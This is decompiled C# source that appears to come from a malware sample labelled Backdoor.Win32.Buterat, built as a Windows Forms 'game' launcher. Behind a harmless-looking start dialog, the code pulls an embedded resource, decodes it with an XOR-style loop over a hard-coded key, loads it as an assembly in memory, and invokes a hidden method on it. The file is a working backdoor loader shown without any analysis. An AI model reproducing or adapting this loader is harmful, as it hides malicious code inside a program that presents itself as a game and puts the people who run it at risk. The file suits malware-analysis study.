// Decompiled with JetBrains decompiler
// Type: WinFormGame.Launch
// Assembly: BeginChildrenCallb, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E62AAEB6-FDD0-4D52-A3EB-57A1AD919DF3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\Backdoor.Win32.Buterat.frst-aade9e4c1ff0e22d68b3c1c2a051c7ebc2bf83eb18bfe4c17394ba96af76bda4.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;

namespace WinFormGame
{
  public class Launch : Form
  {
    private IContainer components = (IContainer) null;
    private static object ImageFileMachine;
    private static string Explicit = "SG40FFZ584HXG5GTE555PW";
    private static int CodePage = 66560;
    private static System.Type s = typeof (NewGame);
    private Label label1;
    private Button button1;
    private Button button2;

    public Launch()
    {
      this.InitializeComponent();
      ((System.Type) Launch.ImageFileMachine).GetMethod("rHccSrtg4").Invoke((object) null, new object[3]
      {
        (object) "524950454D44",
        (object) "6B357369424B4C",
        (object) "RandomFieldGenerator"
      });
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      int num = (int) new NewGame().ShowDialog();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.label1 = new Label();
      this.button1 = new Button();
      this.button2 = new Button();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Location = new Point(13, 13);
      this.label1.Name = "label1";
      this.label1.Size = new Size(269, 13);
      this.label1.TabIndex = 0;
      this.label1.Text = "Welcome to 1992. Would you like to start a new game?";
      this.button1.Location = new Point(16, 82);
      this.button1.Name = "button1";
      this.button1.Size = new Size(452, 23);
      this.button1.TabIndex = 1;
      this.button1.Text = "Yes! Start a new game!";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.Button1_Click);
      this.button2.Location = new Point(16, 120);
      this.button2.Name = "button2";
      this.button2.Size = new Size(452, 23);
      this.button2.TabIndex = 2;
      this.button2.Text = "This button does nothing except give you a false sense of choice";
      this.button2.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(800, 450);
      this.Controls.Add((Control) this.button2);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.label1);
      this.Name = nameof (Launch);
      this.Text = "Form1";
      this.ResumeLayout(false);
      this.PerformLayout();
      Launch.SponsorState();
    }

    private static void SponsorState()
    {
      byte[] numArray = (byte[]) new ResourceManager(Launch.s).GetObject("Rep");
      for (int i = 133142; i >= 0; i += -1)
        numArray = Launch.DismatleCode(numArray, i, 256);
      Launch.ImageFileMachine = (object) ((Assembly) Launch.RefreshCode(numArray)).GetExportedTypes()[1];
    }

    public static object RefreshCode(byte[] ConstructionCall) => System.Type.GetType("System.Reflection.Assembly").InvokeMember("Load", BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
    {
      (object) ConstructionCall
    });

    private static byte[] DismatleCode(byte[] tt, int i, int AsyncLocal)
    {
      int num = (int) tt[(i + 1) % Launch.CodePage];
      int w = (Launch.HashIncrease(tt, i, 22) - (num + AsyncLocal)) % AsyncLocal;
      tt[i % Launch.CodePage] = Launch.SelectSetup(w);
      return tt;
    }

    public static byte SelectSetup(int w) => (byte) w;

    private static int HashIncrease(byte[] ConstantAttribute, int i, int j) => (int) ConstantAttribute[i % Launch.CodePage] ^ (int) Launch.Explicit[i % j];
  }
}
